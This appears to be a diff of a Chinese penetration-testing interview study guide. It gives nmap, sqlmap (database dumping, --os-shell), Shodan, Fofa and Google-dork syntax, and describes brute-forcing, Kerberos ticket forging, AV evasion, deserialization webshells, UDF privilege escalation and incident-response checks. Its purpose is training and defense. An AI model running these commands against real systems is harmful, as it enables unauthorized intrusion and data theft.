-**nmap是一个网络扫描软件，用来扫描电脑的网络连接情况、运行的服务等等，也能够推断计算机操作系统或服务的详细信息**nmap -p 1-65535 192.168.1.1 扫描全端口**nmap -sT 192.168.1.1 使用TCP Connect扫描，也是默认扫描方式**nmap -Pn 192.168.1.1 非ping扫描，不执行主机发现，可以跳过防火墙**nmap -sV 192.168.1.1 返回端口以及所对应的服务和版本号**nmap -sS 192.168.1.1 半开扫描，返回端口，原理是采用TCP协议中的第一次握手，通过返回服务器第二次握手确定端口**nmap -sN 192.168.1.1 使用TCP Null扫描，以ARP或ICMP协议发送ping命令，检测存活主机（只进行主机发现，不进行端口扫描）**nmap -p 1-65535 192.168.1.1 指定扫描所有端口，(默认只扫描1000端口，等价于nmap -p-)**nmap -A 192.168.1.1 -A表示全面综合扫描(包含了1-10000端口ping扫描、操作系统扫描、脚本扫描、路由跟踪、服务探测)**nmap -O 192.168.1.1 操作系统检测**nmap -T4 192.168.1.1 -T[0-6]设置定时模板（越高越快）**nmap -v 192.168.1.1 -v或-vv表示显示扫描过程**nmap --script 使用脚本**----------------------------**
+
+**nmap是一个网络扫描软件，用来扫描电脑的网络连接情况、运行的服务等等，也能够推断计算机操作系统或服务的详细信息**
+
+nmap -p 1-65535 192.168.1.1 扫描全端口
+
+**nmap -sT 192.168.1.1 使用TCP Connect扫描，也是默认扫描方式**
+
+nmap -Pn 192.168.1.1 非ping扫描，不执行主机发现，可以跳过防火墙
+
+**nmap -sV 192.168.1.1 返回端口以及所对应的服务和版本号**
+
+nmap -sS 192.168.1.1 半开扫描，返回端口，原理是采用TCP协议中的第一次握手，通过返回服务器第二次握手确定端口
+
+**nmap -sN 192.168.1.1 使用TCP Null扫描，以ARP或ICMP协议发送ping命令，检测存活主机（只进行主机发现，不进行端口扫描）
+
+**nmap -p 1-65535 192.168.1.1 指定扫描所有端口，(默认只扫描1000端口，等价于nmap -p-)**
+
+****nmap -A 192.168.1.1 -A表示全面综合扫描(包含了1-10000端口ping扫描、操作系统扫描、脚本扫描、路由跟踪、服务探测)****
+
+******nmap -O 192.168.1.1 操作系统检测**nmap -T4 192.168.1.1 -T[0-6]设置定时模板（越高越快）****
+
+******nmap -v 192.168.1.1 -v或-vv表示显示扫描过程**nmap --script 使用脚本****
+
+**----------------------------**
+
 ### Burpsuite
+
 **Burpsuite，著名的web攻击应用程序的集成平台，包含了诸多工具，如暴力破解、编码解码、流量拦截等等**Proxy模块 拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截、查看、修改在两个方向上的原始数据流**Intruder模块 高度可配置的工具，对web应用程序进行自动化攻击、暴力破解等等**Repeater模块 靠手动操作来补发单独的HTTP请求，并分析应用程序响应的工具**Decoder模块 进行手动执行或对应用程序数据者智能解码编码的工具**Scanner模块 仅限专业版拥有，是一个高级的工具，能自动地发现web应用程序的安全漏洞**Spider模块 智能感应的网络爬虫，能完整的枚举应用程序的内容和功能**----------------------------**
+
 ### Sqlmap
+
 **Sqlmap是一个开源渗透测试工具，主要用于检测SQL注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能：包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。**sqlmap -u "http://www.xx.com?id=x" 设置目标的url**sqlmap -r "mlh.txt" 用于post注入，将burp拦截的数据包右键保存为txt，随后用sqlmap加载**sqlmap -p "id" 对指定参数进行注入**sqlmap --dbs 破解所有数据库（爆数据库）**sqlmap --tables -D mlh 破解mlh库下的所有表（爆表名）**sqlmap --columns -T mlh 破解mlh表下的所有字段名**sqlmap --dump -C name,password 获取字段中的内容 （爆字段）**sqlmap --current-db 当前数据库名 （爆数据库名）**sqlmap --current-user 当前数据库的用户名**sqlmap --batch 任何选项都选择默认**sqlmap --cookie "cookie值" cookie注入**sqlmap --level X 设置扫描等级，最高为X=5**sqlmap --risk X X取值0~3，risk越高就越慢，但是风险降低**sqlmap --os-shell 文件写入挂马 （挂马）**sqlmap --os-dbms 爆数据库类型**sqlmap --tamper ***.py,***.py 使用脚本，后面参数为tamper库中的py文件**
+
 ### Fofa
-**title="beijing"丨从<title>标签，标题中搜索“北京”**header="elastic"丨从http的<head>标签中搜索“elastic”**body="网络空间测绘"丨从html正文中搜索“网络空间测绘”**host=".gov.cn"丨从url中搜索”.gov.cn”，搜索要用host作为名称**port="6379"丨搜索对应“6379”端口的资产**ip="220.181.111.1/24"丨查询IP为“220.181.111.1”的C网段资产**os="centos"丨搜索CentOS资产**server="Microsoft-IIS/10"丨搜索IIS 10服务器**app="JAWS/1.0"丨搜索JAWS/1.0的设备**protocol="ftp"丨查询quic协议资产，搜索指定协议类型(在开启端口扫描的情况下有效)**status_code="402"丨查询服务器状态为“402”的资产**after="2017" && before="2017-10-01"丨时间范围段搜索**city="Ürümqi"丨搜索指定城市的资产**region="Xinjiang"丨搜索指定行政区的资产**country="CN"丨搜索指定国家(编码)的资产**------------------------------
+
+**title="beijing"丨从`<title>`标签，标题中搜索“北京”**header="elastic"丨从http的`<head>`标签中搜索“elastic”**body="网络空间测绘"丨从html正文中搜索“网络空间测绘”**host=".gov.cn"丨从url中搜索”.gov.cn”，搜索要用host作为名称**port="6379"丨搜索对应“6379”端口的资产**ip="220.181.111.1/24"丨查询IP为“220.181.111.1”的C网段资产**os="centos"丨搜索CentOS资产**server="Microsoft-IIS/10"丨搜索IIS 10服务器**app="JAWS/1.0"丨搜索JAWS/1.0的设备**protocol="ftp"丨查询quic协议资产，搜索指定协议类型(在开启端口扫描的情况下有效)**status_code="402"丨查询服务器状态为“402”的资产**after="2017" && before="2017-10-01"丨时间范围段搜索**city="Ürümqi"丨搜索指定城市的资产**region="Xinjiang"丨搜索指定行政区的资产**country="CN"丨搜索指定国家(编码)的资产**------------------------------
 
 ### Shodan
+
 **http.html:"Beijing"丨网页内容**html.title:"Cisco"丨网页标题**http.server:"Microsoft-IIS/10"丨http请求返回中server的类型**http.status:"200"丨http请求返回响应码的状态**hostname:"google"丨搜索指定的主机或域名**port:"21"丨搜索指定的端口或服务**country:"CN"丨搜索指定的国家**city:"Hefei"丨搜索指定的城市**org:"google"丨搜索指定的组织或公司**product:"Apache httpd"丨搜索指定的操作系统/软件/平台**version:"1.6.2"丨搜索指定的软件版本**before/after:"11-09-19"丨搜索指定收录时间前后的数据，格式为dd-mm-yy**net:"210.45.240.0/24"丨搜索指定的IP地址或子网**vuln：CVE-2014-0723丨搜索CVE漏洞编号**Server:SQ-WEBCAM丨查找SQ-WEBCAM摄像头**------------------------------**
+
 ### Google hacking（谷歌骇客语法）
+
 **intitle:孟令昊--把搜索范围限定在网页标题中**inurl:jsp?id=--把搜索范围限定在url链接中**site:mlh.com--把搜索范围限定在特定站点中（可用于搜索子域名）**filetype:doc--搜索范围限定在指定文档格式中**intext:孟令昊--搜索范围限定在指定在正文关键字中**link:mlh.com--返回所有和该网站做了链接的url**info:--查找指定站点的基本信息**cache:--查找关于某些内容的缓存**
 
 ## 安全设备问题
+
 **什么是ips？
 对该设备的网络流量进行分析监控，发现攻击后就会进行拦截。IPS是防火墙的重要补充，如果是防火墙是第一道防线，IPS就是第二道防线。
 什么是ids
@@ -339,14 +605,16 @@ ids监听 ips控制
  用过。主要用天眼来进行流量分析和流量监控，并且可以用他的日志检索模块进行溯源。
 ips和ids分别在网络中如何部署？
 ips有阻断操作，一般都是串接的设备，ids旁挂就可以**
+
 ## 经验问题
+
 **项目进场的工作流程
 (1)了解项目情况，包括人员组成等
 (2)了解项目上的设备：如拓扑图，以及安全布防设备等
 (3)确认工作内容，核查各项设备是否能够正常使用
 (4)确认紧急联系人以及紧急事件上报流程
 交到漏洞盒子，cnvd这一类漏洞平台的漏洞网站都是怎么找到的?（漏洞挖掘、漏洞怎么挖的）
-(1)一般就是通过谷歌骇客语法，比如搜可能存在sql注入的网站:inurl:php?id=1 
+(1)一般就是通过谷歌骇客语法，比如搜可能存在sql注入的网站:inurl:php?id=1
 (2)还有就是用鹰图或者fofa，搜一下比如想要搜后台类的网站body=”后台”，或者搜一些可能存在默认密码的网站body=”默认密码为admin”等。
 这个自由发挥，上面的仅供参考
 渗透测试时需要注意什么问题？
@@ -377,7 +645,7 @@ ips有阻断操作，一般都是串接的设备，ids旁挂就可以**
 第三种情况 输入用户名和密码点击登录以后,页面显示用户名或者密码错误,没法根据页面回显来判断此用户名是否存在，然后使用burpsuite进行抓包，将用户名和密码进行设置，使用双变量爆破,分别导入用户名密码本和密码的密码本。
 爆破不行的话，我会再尝试试试别的一些漏洞比如看看是否可能存在sql注入
 看看传输的数据是否能够拼接命令导致命令执行;
-看看是不是有忘记密码之类的操作，看是不是存在逻辑漏洞 
+看看是不是有忘记密码之类的操作，看是不是存在逻辑漏洞
 看一下网站的语言，框架，看是不是 存在已知的漏洞
 使用漏扫工具（awvs）扫一下看看，是不是能扫到漏洞，扫到的话在进行手工验证
 看看传输的数据是否能够拼接命令导致命令执行
@@ -392,7 +660,7 @@ ips有阻断操作，一般都是串接的设备，ids旁挂就可以**
 **
 **8、域渗透思路**通过域成员主机，定位出域控制器 IP 以 及域管理员账号，利用域成员主机作为 跳板，扩大渗透范围。利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机 IP，设法从该域成员主机内存中dump出域管理员密码，进而拿下域控制器。
 **9、找到域控（如何找到域控）：
-去寻找dns域名服务器 一般域控就是dns域名服务器，一般域控主机会开启dns服务和ltap服务，可能开放389端口和53端口 
+去寻找dns域名服务器 一般域控就是dns域名服务器，一般域控主机会开启dns服务和ltap服务，可能开放389端口和53端口
 命令：ipconfig -all，还有 net time
 
 10、项目的渗透测试和挖src有什么区别？
@@ -446,13 +714,13 @@ awvs,goby:扫描漏洞
 26、溯源的常见手法？
  答：首先可以通过安全设备查到攻击ip，然后通过相关网站反查手机号和邮箱，之后可以通过社交软件或购物平台描绘出攻击者画像。
  常用反查网站有ipwhois，微步，站长之家等**
-## 
+
 内网问题
 **什么是域控?
 可以对域内的机器进行控制，拥有较高的权限。
 域控是域控制器的简称，域控制器是指在"域"模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作
 如何查找域控?
-来去寻找dns域名服务器 一般域控就是dns域名服务器 
+来去寻找dns域名服务器 一般域控就是dns域名服务器
 命令：ipc onfig -all，还有 net time
 如何进行内网横向渗透？
 首先进行信息收集 查找 net view 处于同一局域网的机器列表
@@ -476,7 +744,7 @@ java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xm
 ****白银票据：白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGS。因为在票据生成过程中不需要使用KDC(即没有前四步)，所以可以绕过域控制器(在kerberos协议第五阶段发起的攻击)
 
 免杀有了解吗
-有过简单的了解，可以用 msf 或者 cs 结合其它的框架生成免杀马，主要就是 静态免杀和动态免杀方式：可以通过替换 api，重 写 api，合理替换调用顺序，绕过调用 源来免杀 
+有过简单的了解，可以用 msf 或者 cs 结合其它的框架生成免杀马，主要就是 静态免杀和动态免杀方式：可以通过替换 api，重 写 api，合理替换调用顺序，绕过调用 源来免杀
 静态免杀方式：替换特征码，替换资源， 修改入口点，（peid工具加壳）加壳。**
 
 ## 应急响应问题
@@ -502,20 +770,20 @@ java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xm
 1.windows应急响应**2进程排查 netstat -ano 查看目前的网络连接，定位可以的 ESTABLISHED，根据 netstat 定位的 pid（进程编号），再通过 taskli st显示运行本地或远程计算机的所有进程**3用户组情况判断 查看服务器中的,dos 命令 net user 查看隐藏的账户，
 **注册表HKEY_LOCAL_ MACHINE\SAM\SAM\Domains\Acco unt\Users\Names **1、服务相关判断 运行 command+R m sconfig（打开系统设置）服务 **2、系统启动项排查 msconfig 启动 **3、计划任务创建/删除检测 cmd 中 scht asks.exe **4、注册表的排查 注册表的排查，建议 使用杀软去做 **5、文件排查 查看最近访问的目录：recent webshell：D盾、河马 webshell C2 后门：360、卡巴、诺顿 **6、日志排查 windows 登录日志排查 运行 eventvwr 4624 账号成功登录 4625 账号登录失败**7、中间件日志排查 不同中间件有不同日志目录 看源ip目的 url 时间 响应码 可以用工具：360星图日志结尾一般为acess.logo
 **linux应急响应
-1、文件排查：tmp 目录文件（临时文件） ls -alt /tmp 
-2、启动项排查：查看开启启动项内容 ls -alt /etc/init.d/ 
-3、查看命令执行记录： 直接 history 或 者 cat ~/.bash_history 
-4用户信息排查 /etc/passwd 
-5计划任务排查： crontab -l 查看当 前的计划有那些，是否有后门木马程序 启动相关信息 
-6进程排查： netstat -antlp，根据 n etstat 定位出 pid，使用 ps 命令，分析 进程 top 
-7系统登录日志排查： ssh 日志：/var/log/lastlog 查看最近登 录的记录 系统中所有用户最近一次登录信息：las tlog 
-8中间件日志查询 Apache：/var/log/httpd/ Ngix：/var/log/nginx/ 
+1、文件排查：tmp 目录文件（临时文件） ls -alt /tmp
+2、启动项排查：查看开启启动项内容 ls -alt /etc/init.d/
+3、查看命令执行记录： 直接 history 或 者 cat ~/.bash_history
+4用户信息排查 /etc/passwd
+5计划任务排查： crontab -l 查看当 前的计划有那些，是否有后门木马程序 启动相关信息
+6进程排查： netstat -antlp，根据 n etstat 定位出 pid，使用 ps 命令，分析 进程 top
+7系统登录日志排查： ssh 日志：/var/log/lastlog 查看最近登 录的记录 系统中所有用户最近一次登录信息：las tlog
+8中间件日志查询 Apache：/var/log/httpd/ Ngix：/var/log/nginx/
 9后门排查 使用河马 webshell /find(命令) 可以用工具：GScan
 10勒索病毒处置流程？
 a首先了解现状，了解发病时间和系统架构，并且确认被感染的主机
-11然后先进行临时处置，对被感染的主机进行网络隔离，禁止使用移动存储设备，对未感染的主机进行ACL 隔离，关闭 SSH（linux的远控）、RDP（windows的远控）等协议，也不能使用移动存储设备 
+11然后先进行临时处置，对被感染的主机进行网络隔离，禁止使用移动存储设备，对未感染的主机进行ACL 隔离，关闭 SSH（linux的远控）、RDP（windows的远控）等协议，也不能使用移动存储设备
 12获取样本，windows 系统进行文件排查、进程排查、系统信息排查、系统日志排查；linux 系统排查文件、进程、日志
-13进行进一步的处置，对已经感染的主机进行断网隔离，等待解密进展，最后重装系统。对未感染的主机进行补丁修复，还可以使用安全软件进行防护并及时更新病毒库/规则库 
+13进行进一步的处置，对已经感染的主机进行断网隔离，等待解密进展，最后重装系统。对未感染的主机进行补丁修复，还可以使用安全软件进行防护并及时更新病毒库/规则库
 14最后是防御，定期打补丁、部署杀软、 对口令策略进行加固，部署流量检测设备
 15挖矿应急响应？（括号为组织语言）
 a、判断（第一步先判断）
@@ -534,35 +802,36 @@ b、事件分析（第二步分析）** (1)登录网站服务器，查看进程�
 **处理过程（简略版）：**1、发现异常：出口防火墙、本地端口连接情况，主动向外网发起大量连接**2、病毒查杀：卡巴斯基全盘扫描，发现异常文件**3、确认病毒：使用多引擎在线病毒对该文件扫描，确认服务器感染conficker蠕虫病毒。**4、病毒处理：使用conficker蠕虫专杀工具对服务器进行清查，成功清除病毒。
 
 **预防：**1、安装杀毒软件，定期全盘扫描**2、不使用来历不明的软件，不随意接入未经查杀的U盘**3、定期对windows系统漏洞进行修复，不给病毒可乘之机**4、做好重要文件的备份，备份，备份。**
-## 
-最近比较新的漏洞 
+
+最近比较新的漏洞
 **f5 身份验证绕过 **struts2 s2-062 远程命令执行漏洞 **spring framework 远程命令执行漏洞 **去年的 apache log4j 漏洞**网络相关知识**cdn（内容分发网络）**原理：cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就能更快的获取到需要的数据。**下面是个栗子，可不说**（举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。）**检测网站是否开启cdn**使用多地ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了CDN**cdn查询真实ip**dns服务（域名转换为ip）** （要了解cdn就先要了解一下dns。当我们在浏览器中输入一个域名时，首先需要将域名转换为ip地址，再将ip地址转换为mac地址，这样才能在网络上找到该服务器。我们先不看ip转换mac地址的过程，先来看看是怎么将一个域名转换为ip的。）**原理：当我们向dns服务器发起解析域名的请求时，dns服务器首先会查询自己的缓存中有没有该域名，如果缓存中存在该域名，则可以直接返回ip地址。如果缓存中没有，服务器则会以递归的方式层层访问。**（例如，我们要访问www.baidu.com，首先我们会先向全球13个根服务器发起请求，询问com域名的地址，然后再向负责com域名的名称服务器发送请求，找到baidu.com，这样层层递归，最终找到我们需要的ip地址。）**补充目录：**“永恒之蓝”漏洞**原理：**利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。永恒之蓝是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。**SMB协议（补充）：SMB（全称是Server Message Block）是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用TCP139端口和TCP445端口。**Tcp三次握手与四次挥手**三次握手**●第一次：客户端发送初始序号x和syn=1请求标志**●第二次：服务器发送请求标志syn，发送确认标志ACK，发送自己的序号seq=y，发送客户端的确认序号ack=x+1**●第三次：客户端发送ACK确认号，发送自己的序号seq=x+1，发送对方的确认号ack=y+1**四次挥手**●第一次挥手：客户端发出释放FIN=1，自己序列号seq=u，进入FIN-WAIT-1状态**●第二次挥手：服务器收到客户端的后，发出ACK=1确认标志和客户端的确认号ack=u+1，自己的序列号seq=v，进入CLOSE-WAIT状态**●第三次挥手：客户端收到服务器确认结果后，进入FIN-WAIT-2状态。此时服务器发送释放FIN=1信号，确认标志ACK=1，确认序号ack=u+1，自己序号seq=w，服务器进入LAST-ACK（最后确认态）**●第四次挥手：客户端收到回复后，发送确认ACK=1，ack=w+1，自己的seq=u+1，客户端进入TIME-WAIT（时间等待）。客户端经过2个最长报文段寿命后，客户端CLOSE；服务器收到确认后，立刻进入CLOSE状态。
 
 ## 面试题目
-**1、基础漏洞**太多了：端口  服务常见漏洞、常见数据库漏洞、常见web类漏洞、WEB服务器漏洞**（1）端口  服务常见漏洞
 
+**1、基础漏洞**太多了：端口  服务常见漏洞、常见数据库漏洞、常见web类漏洞、WEB服务器漏洞**（1）端口  服务常见漏洞
 
 | ** 21
  |  | **FTP
  | **匿名访问，弱口令
- |
-| --- | --- | --- | --- |
-| **22          SSH            弱口令登录**23          Telnet          弱口令登录**80          Web            常见Web漏洞或后台登录弱口令**161         SNMP         public弱口令**389         LDAP          匿名访问**443         openssl       心脏滴血等**445         smb            操作系统溢出漏洞**873         rsync          匿名访问，弱口令**1099       JAVArmi      命令执行**1433       MsSQL        弱口令**1521       Oracle         弱口令**2601       Zebra          默认密码zebra
- |  |  |  |
+
+|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |  |  |  |
+| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | - | - | - |
+| **22          SSH            弱口令登录**23          Telnet          弱口令登录**80          Web            常见Web漏洞或后台登录弱口令**161         SNMP         public弱口令**389         LDAP          匿名访问**443         openssl       心脏滴血等**445         smb            操作系统溢出漏洞**873         rsync          匿名访问，弱口令**1099       JAVArmi      命令执行**1433       MsSQL        弱口令**1521       Oracle         弱口令**2601       Zebra          默认密码zebra |  |  |  |
+|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |  |  |  |
 
 **
-
 
 | **3128       squid     匿名访问（可能内网漫游）**3306       MySQL         弱口令**3389       RDP             远程桌面弱口令
- |
-| --- |
+
+|  |
+| - |
 
 **
 
-
 | **4440       Rundeck       弱口令admin**4848   GlassFish  弱口令admin/adminadmin**5432       PostGreSQL   弱口令爆破**6379       Redis            匿名访问**7001,7002   Weblogic    弱口令爆破**8080      Tomcat\\Jboss  弱口令，Jboss匿名访问**8080-8090   常见Web端口**9043           WebSphere  弱口令爆破**27017         MongoDB      未授权访问**
- |
-| --- |
+
+|  |
+| - |
 
 ****（2）数据库漏洞：MySQL数据库、MSSQL数据库、Oracle数据库、PostgreSQL数据库、Redis数据库等等**（3）常见web类漏洞：WEB中间件: Tomcat、Jboss、WebLogic**（4）WEB服务器漏洞：IIS(Windows 的 WWW 服务器)、Apache、Nginx、lighttpd**2、溯源和应急响应**（1）应急响应的流程**1.准备已经编译好的工具以及取证分析等工具干净可靠放U盘**2.初步判断事件的类型，是被入侵、ddos还是其它的原因**3.首先抑制范围、影响范围，隔离使受害面不继续扩大。**4.寻找原因，封堵攻击源。**5.把业务恢复至正常水平**6.监控有无异常，报告、管理环节的自省和改进措施。****（2）溯源**溯源方式：第一种，可以通过相关联的域名/IP进行追踪；**第二种，对钓鱼网站进行反向渗透获取权限，进一步收集攻击者信息；**第三种，通过对邮件恶意附件进行分析，利用威胁情报数据平台寻找同源样本获取信息，也能进一步对攻击者的画像进行勾勒。****3、Java反序列**答案一**反序列化漏洞写Webshell**修改ysoserial使其支持生成java代码执行Payload，如果调用ysoserial时候命令参数处有code:就可执行java代码，否则执行命令**使用stderr输出，防止影响payload的输出，然后重新使用mvn编译ysoserial**获取网站路径，向web目录写文件，写webshell****答案二**就是指把字节序列恢复为 java 对象的过程，一般都是利用专门的反序列化测 试工具 如果存在 struts2 这个框架漏洞 那么可以直接在测试工具的输入 框执行命令、****4、udf提权**答案一**MySQL_UDF提取**要求: 1.目标系统是Windows(Win2000,XP,Win2003)；2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数** 3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数** 可以再mysql里输入select @@basedirshow variables like ‘%plugins%’ 寻找mysql安装路径 提权:**使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；****答案二**UDF (user defined function)，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充， **其实就像使用本地MySQL函数如 user() 或 concat() 等
 
